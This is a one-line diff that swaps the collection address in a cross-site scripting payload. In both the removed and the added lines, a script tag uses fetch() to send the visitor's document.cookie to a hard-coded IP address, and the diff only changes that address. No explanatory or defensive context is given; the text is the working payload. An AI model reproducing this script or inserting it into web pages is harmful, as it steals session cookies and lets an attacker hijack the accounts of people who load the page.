@@ -1,1 +1,1 @@
-<script>fetch("https://10.42.87.236/.session="+encodeURIComponent(document.cookie))</script>
+<script>fetch("https://10.42.104.81/.session="+encodeURIComponent(document.cookie))</script>
